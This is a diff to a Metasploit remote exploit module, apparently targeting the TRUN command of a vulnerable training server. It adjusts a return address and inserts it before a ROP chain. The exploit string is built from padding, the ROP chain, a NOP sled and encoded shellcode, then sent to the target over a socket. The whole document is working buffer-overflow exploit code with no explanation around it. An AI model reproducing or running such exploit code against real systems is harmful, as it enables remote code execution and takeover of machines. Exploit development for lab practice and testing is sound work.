@@ -40,7 +40,8 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       [
         [ 'EssFuncDLL-retn',
           {
-            'retn' => 0x62501023 # This will be available in [target['jmpesp']]
+            # Not really needed
+            'retn' => 0x62501029 # This will be available in [target['jmpesp']]
           }
         ]
       ],
@@ -94,7 +95,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
     connect	# Connect to the target
 
     shellcode = payload.encoded	# Generated and encoded shellcode
-    outbound = 'TRUN /.:/' + "A"*(datastore['RETOFFSET']) + create_rop_chain() + "\x90" * 8 + shellcode + "\x90" * 990 # Create the malicious string that will be sent to the target
+    outbound = 'TRUN /.:/' + "A"*(datastore['RETOFFSET']) + [target['retn']].pack('V') + create_rop_chain() + "\x90" * 8 + shellcode + "\x90" * 990 # Create the malicious string that will be sent to the target
 
     print_status("Sending Exploit")
     sock.put(outbound)	# Send the attacking payload
